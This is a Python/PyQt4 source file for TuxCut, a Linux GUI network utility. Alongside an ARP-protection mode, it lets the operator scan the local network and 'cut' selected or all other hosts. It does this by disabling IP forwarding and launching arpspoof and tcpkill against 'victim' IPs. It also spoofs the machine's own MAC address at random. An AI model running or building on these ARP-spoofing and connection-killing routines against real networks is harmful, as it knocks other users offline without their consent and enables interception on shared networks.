# -*- coding: utf-8 -*-
import sys
import os
import random
import socket
import subprocess as sp
from threading import Thread
from PyQt4 import QtCore,QtGui,uic,QtNetwork
from AboutDialog import AboutDialog
import pix_rc

class TuxCut(QtGui.QMainWindow):
	def __init__(self):
		print os.getcwd()

		print "arguments(%d):" %len(sys.argv)
		for argument in sys.argv:
			print argument

		QtGui.QMainWindow.__init__(self)
		uic.loadUi('ui/MainWindow.ui',self)
		
		# load ini
		self.settings = QtCore.QSettings("linuxac.org","TuxCut")
		if self.settings.value("Language")=="English":
			self.actionArabic.setChecked(False)
			self.actionEnglish.setChecked(True)

		if not len(sys.argv) == 2:
			self.actionHideTrayIcon.triggered.connect(self.toggle_tray_icon)
		else:
			self.actionHideTrayIcon.setVisible(False)
		
		# List Available network interfaces
		ifaces_names = []
		ifaces_macs = []   
		ifaces = QtNetwork.QNetworkInterface.allInterfaces()
		for i in ifaces:
			ifaces_names.append(str(i.name()))
			ifaces_macs.append(str(i.hardwareAddress()))
		Result,ok = QtGui.QInputDialog.getItem(self,self.tr("Network Interfaces"),self.tr("Select your Interface:"),ifaces_names,0,True)
		if ok:
			self._iface = Result
			self._my_mac =ifaces_macs[ifaces_names.index(Result)]
			for j in ifaces_names:
				self.comboIfaces.addItem(j)
			self.comboIfaces.setCurrentIndex(ifaces_names.index(Result))  # Set the selected interface card in the main windows comboBox
		else:
			self.msg(self.tr("You must select an interface card , TuxCut Will close"))
			exit(0)
		
		self._args_len = len(sys.argv)
		self.hide_tray_icon = False
		self._trayMessageTimeout=1000
		self._gwMAC=None
		self._isProtected = False
		self._isFedora = False
		self.check_fedora()
		self._isQuit = False
		self._cutted_hosts = {}
		self._killed_hosts = {}
		self.table_hosts.setSelectionMode(QtGui.QAbstractItemView.ExtendedSelection)
		self.show_Window()
		self._gwIP = self.default_gw()
		self._sudo = 'sudo'
		if  self._gwIP==None:
			self.msg(self.tr("TuxCut couldn't detect the gateway IP address"))
		self._gwMAC = self.gw_mac(self._gwIP)
		if self._my_mac==None:
			self.msg(self.tr("TuxCut couldn't detect your MAC address"))
		else:
			self.lbl_mac.setText(self._my_mac)
		
		if not self._gwMAC==None:
			self.enable_protection()
		else:
			self.msg(self.tr("TuxCut couldn't detect the gateway MAC address\nThe protection mode couldn't be enabled"))
		self.list_hosts(self._gwIP)
		
		
	def show_Window(self):
		screen = QtGui.QDesktopWidget().screenGeometry()
		size =  self.geometry()
		self.move((screen.width()-size.width())/2, (screen.height()-size.height())/2)

		self.table_hosts.setColumnWidth(0,150)
		self.table_hosts.setColumnWidth(1,150)
		self.table_hosts.setColumnWidth(2,200)
		self.show()

		if not self._args_len == 2:
			self.tray_icon()

	def tray_icon(self):
		self.trayicon=QtGui.QSystemTrayIcon(QtGui.QIcon('./pix/tuxcut_32.png'))
		self.trayicon.show()
		self.menu=QtGui.QMenu()
		
		self.menu.addAction(self.actionOpen_Tuxcut)
		self.menu.addAction(self.action_change_mac)
		self.menu.addAction(self.action_quit)

		self.trayicon.setContextMenu(self.menu)
		self.trayicon.activated.connect(self.onTrayIconActivated)
		
	def onTrayIconActivated(self, reason):
		if reason == QtGui.QSystemTrayIcon.DoubleClick:
			if self.isVisible():
				self.hide()
				if not self._args_len == 2:
					self.trayicon.showMessage('TuxCut is still Running', 'The programe is still running.\n Right click the trayicon to resore TuxCut or to Quit',msecs=self._trayMessageTimeout)
			else:
				self.show()

	def on_open_tuxcut_clicked(self):
		self.actionOpen_Tuxcut.setEnabled(False)
		self.show()

		if self.hide_tray_icon:
			print "trayicon hidden !!!"
			self.trayicon.hide()
		else:
			print "trayicon visible !!!"
			self.trayicon.show()

	def toggle_tray_icon(self):
		self.hide_tray_icon = not self.hide_tray_icon

		if self.hide_tray_icon:
			print "trayicon hidden !!!"
			self.trayicon.hide()
		else:
			print "trayicon visible !!!"
			self.trayicon.show()
				
	def closeEvent(self, event):
		'''
		This make the close button just hide the application
		'''
		if self._args_len == 2:
			self.disable_protection()
			self.close()
			sys.exit(0)
		else:
			if not self._isQuit:
				event.ignore()
				if self.isVisible():
					self.hide()
					self.trayicon.show()
					self.actionOpen_Tuxcut.setEnabled(True)
					self.trayicon.showMessage(self.tr('TuxCut is still Running'),self.tr('The programe is still running.\n Double click the trayicon to resore TuxCut or to Quit'),msecs=self._trayMessageTimeout)
			else:
				self.disable_protection()
				self.trayicon.hide()
				self.close()
				sys.exit(0)

	def check_fedora(self):
		if os.path.exists('/etc/redhat-release'):
			self._isFedora = True
		else:
			self._isFedora = False
			
	def default_gw(self):
		gwip = sp.Popen(['ip','route','list'],stdout = sp.PIPE)
		for line in  gwip.stdout.readlines():
			if 'default' in line:
				#self._iface = line.split()[4]
				return  line.split()[2]	

	def gw_mac(self,gwip):
		arping = sp.Popen([self._sudo,'arp-scan','-gI',self._iface,self._gwIP],stdout = sp.PIPE,shell=False)
		for line in arping.stdout.readlines():
			if line.startswith(self._gwIP.split('.')[0]):
				print "Gateway MAC:", line.split()[1]
				return line.split()[1]

	def list_hosts(self, ip):
		live_hosts = []
		if self._isProtected:
			print "Protected"
			arping = sp.Popen([self._sudo,'arp-scan','-gI',self._iface,ip+'/24'],stdout = sp.PIPE,shell=False)
		else:
			print "Not Protected"
			arping = sp.Popen([self._sudo,'arp-scan','-gI',self._iface,ip+'/24'],stdout = sp.PIPE,shell=False)

		i=1
		for line in arping.stdout.readlines():
			if line.startswith(ip.split('.')[0]):
				ip = line.split()[0]
				mac= line.split()[1].upper()
				self.table_hosts.setRowCount(i)
				self.table_hosts.setItem(i-1,0,QtGui.QTableWidgetItem(ip))
				self.table_hosts.item(i-1,0).setIcon(QtGui.QIcon('./pix/online.png'))
				self.table_hosts.setItem(i-1,1,QtGui.QTableWidgetItem(mac))
				live_hosts.append(ip)
				i=i+1
		myThread = Thread(target=self.list_hostnames,args=(live_hosts,))
		myThread.start()
				
	def list_hostnames(self,ipList):
		i=0
		for ip in ipList:
			try:
				hostname= socket.gethostbyaddr(ip)
				print hostname[0]
				self.table_hosts.setItem(i,2,QtGui.QTableWidgetItem(hostname[0]))
			except:
				print "Couldn't Resolve  Host ",ip
				self.table_hosts.setItem(i,2,QtGui.QTableWidgetItem("Not Resolved"))
			i=i+1
			
	def enable_protection(self):    
		sp.Popen([self._sudo,'arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		if self._isFedora:
			print "This is a RedHat based distro"
			sp.Popen([self._sudo,'arptables','-P','IN','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			sp.Popen([self._sudo,'arptables','-P','OUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			sp.Popen([self._sudo,'arptables','-A','IN','-s',self._gwIP,'--source-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			sp.Popen([self._sudo,'arptables','-A','OUT','-d',self._gwIP,'--target-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		else:
			print "This is not a RedHat based distro"
			sp.Popen([self._sudo,'arptables','-P','INPUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			sp.Popen([self._sudo,'arptables','-P','OUTPUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			sp.Popen([self._sudo,'arptables','-A','INPUT','-s',self._gwIP,'--source-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			sp.Popen([self._sudo,'arptables','-A','OUTPUT','-d',self._gwIP,'--destination-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen([self._sudo,'arp','-s',self._gwIP,self._gwMAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		
		self._isProtected = True
		print "Protection Enabled!"
		if not self._args_len == 2:
			self.trayicon.showMessage(self.tr('Protection Enabled!'), self.tr('You are protected againest NetCut attacks'),msecs=self._trayMessageTimeout)
		if not self.cbox_protection.isChecked():
			self.cbox_protection.setCheckState(QtCore.Qt.Checked)
		
	def disable_protection(self):
		if self._isFedora:
			sp.Popen([self._sudo,'arptables','-P','IN','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			sp.Popen(['arptables','-P','OUT','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		else:
			sp.Popen([self._sudo,'arptables','-P','INPUT','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			sp.Popen([self._sudo,'arptables','-P','OUTPUT','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen([self._sudo,'arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		self._isProtected = False
		print "Protection Disabled!"
		if not self._args_len == 2:
			self.trayicon.showMessage(self.tr('Protection Disabled!'), self.tr('You are not protected againest NetCut attacks'),msecs=self._trayMessageTimeout)
		
	def cut_process(self,victim_IP,row):
		## Disable ip forward
		proc = sp.Popen([self._sudo,'sysctl','-w','net.ipv4.ip_forward=0'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		
		### Start Arpspoofing the victim
		proc_spoof = sp.Popen([self._sudo,'arpspoof','-i',self._iface,'-t',self._gwIP,victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		#os.system("tcpkill -i "+icard+" -3 net "+vicip+" & >/dev/null")
		proc_kill = sp.Popen([self._sudo,'tcpkill','-i',self._iface,'-3','net',victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		self._cutted_hosts[victim_IP]=proc_spoof.pid
		self._killed_hosts[victim_IP]=proc_kill.pid
		self.table_hosts.item(row,0).setIcon(QtGui.QIcon('./pix/offline.png'))
	
	def resume_all(self):
		sp.Popen([self._sudo,'sysctl','-w','net.ipv4.ip_forward=1'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen([self._sudo,'killall','arpspoof'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen([self._sudo,'killall','tcpkill'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		hosts_number = self.table_hosts.rowCount()
		for i in range (0,self.table_hosts.rowCount()):
			self.table_hosts.item(i,0).setIcon(QtGui.QIcon('./pix/online.png'))
			i=+1
		self._cutted_hosts.clear()
		self._killed_hosts.clear()
		
	def resume_single_host(self,victim_IP,row):
		if self._cutted_hosts.has_key(victim_IP):
			pid_spoof = self._cutted_hosts[victim_IP]
			sp.Popen([self._sudo,'kill','9',str(pid_spoof)],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			# os.kill(pid_spoof,9)
			self.table_hosts.item(row,0).setIcon(QtGui.QIcon('./pix/online.png'))
			del self._cutted_hosts[victim_IP]
		if self._killed_hosts.has_key(victim_IP):
			pid_kill = self._killed_hosts[victim_IP]
			sp.Popen([self._sudo,'kill','9',str(pid_kill)],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			# os.kill(pid_kill,9)
			del self._killed_hosts[victim_IP]

		self.print_cutted_hosts()
		self.print_killed_hosts()
		
	def change_mac(self):
		new_MAC =':'.join(map(lambda x: "%02x" % x, [ 0x00,
													random.randint(0x00, 0x7f),
													random.randint(0x00, 0x7f),
													random.randint(0x00, 0x7f),
													random.randint(0x00, 0xff),
													random.randint(0x00, 0xff)]))
		print 'Your new MAC is : ',new_MAC
		self.lbl_mac.setText(new_MAC)
		sp.Popen([self._sudo,'ifconfig',self._iface,'down','hw','ether',new_MAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen([self._sudo,'ifconfig',self._iface,'up'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		
	def on_protection_changes(self):
		if self.cbox_protection.isChecked():
			self.enable_protection()
		else:
			self.disable_protection()
			
	def on_refresh_clicked(self):
		self._iface= self.comboIfaces.currentText()
		self.list_hosts(self._gwIP)
	
	def on_cut_clicked(self):
		rows = self.table_hosts.selectionModel().selectedRows()

		for item in rows:
			row = item.row()
			victim_IP = str(self.table_hosts.item(row,0).text())
			print "cutting connection from:", victim_IP
			if not victim_IP==None and not victim_IP==self._gwIP:
				self.cut_process(victim_IP,row)

		self.print_cutted_hosts()
		self.print_killed_hosts()

		# selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
		
		# # print selectedRow
		# victim_IP =str(self.table_hosts.item(selectedRow,0).text())
		# if not victim_IP==None:
		# 	self.cut_process(victim_IP,selectedRow)

	def on_cut_all_clicked(self):
		row_count = self.table_hosts.rowCount()

		for row in range(0, row_count):
			victim_IP =str(self.table_hosts.item(row,0).text())
			if not victim_IP==None and not victim_IP==self._gwIP:
				self.cut_process(victim_IP,row)

		self.print_cutted_hosts()
		self.print_killed_hosts()

	def on_resume_clicked(self):
		selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
		victim_IP =str(self.table_hosts.item(selectedRow,0).text())
		if not victim_IP==None:
			self.resume_single_host(victim_IP,selectedRow)
	
	def on_quit_triggered(self):
		self._isQuit = True
		self.resume_all()
		self.closeEvent(QtGui.QCloseEvent)
		
	def on_about_clicked(self):
		about_dialog = AboutDialog()
		about_dialog.exec_()
		
	def msg(self,text):
		msgBox = QtGui.QMessageBox()
		msgBox.setText(text)
		msgBox.setStandardButtons(QtGui.QMessageBox.Close)
		msgBox.setDefaultButton(QtGui.QMessageBox.Close)
		ret = msgBox.exec_()
		if ret==QtGui.QMessageBox.Close:
			#sys.exit()
			pass
		
	def arabic_selected(self):
		self.actionEnglish.setChecked(False)
		self.settings.setValue("Language","Arabic")
		
	def english_selected(self):
		self.actionArabic.setChecked(False)
		self.settings.setValue("Language","English")
		
	def limit_speed(self):
		speedLimit, ok = QtGui.QInputDialog.getInteger(self, self.tr('Speed Limiter'), self.tr('Enter your desired speed in Kilo-Bytes per second:'))
		if ok:
			self.action_speedlimiter_on.setChecked(True)
			self.action_speedlimiter_off.setChecked(False)
			sp.Popen([self._sudo,'wondershaper',self._iface,str(speedLimit),'9999999'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
			self.trayicon.showMessage(self.tr('Speed Limiter Enabled!'), self.tr('Your Speed is limited to %s Kb/Sec'%speedLimit),msecs=self._trayMessageTimeout)
		else:
			self.action_speedlimiter_off.setChecked(True)
			self.action_speedlimiter_on.setChecked(False)

	def unlimit_speed(self):
		self.action_speedlimiter_on.setChecked(False)
		sp.Popen([self._sudo,'wondershaper','clear',self._iface],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		sp.Popen([self._sudo,'killall','9','wondershaper'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
		self.trayicon.showMessage(self.tr('Speed Limiter Disabled!'), self.tr('Your Speed is not limited'),msecs=self._trayMessageTimeout)
		
	def about_qt(self):
		QtGui.QApplication.aboutQt()

	def print_cutted_hosts(self):
		if len(self._cutted_hosts) > 0:
			print "Cutted hosts are:"
			for ip, pid in self._cutted_hosts.iteritems():
				print "%s\t%d" %(ip, pid)

	def print_killed_hosts(self):
		if len(self._killed_hosts) > 0:
			print "Killed hosts are:"
			for ip, pid in self._killed_hosts.iteritems():
				print "%s\t%d" %(ip, pid)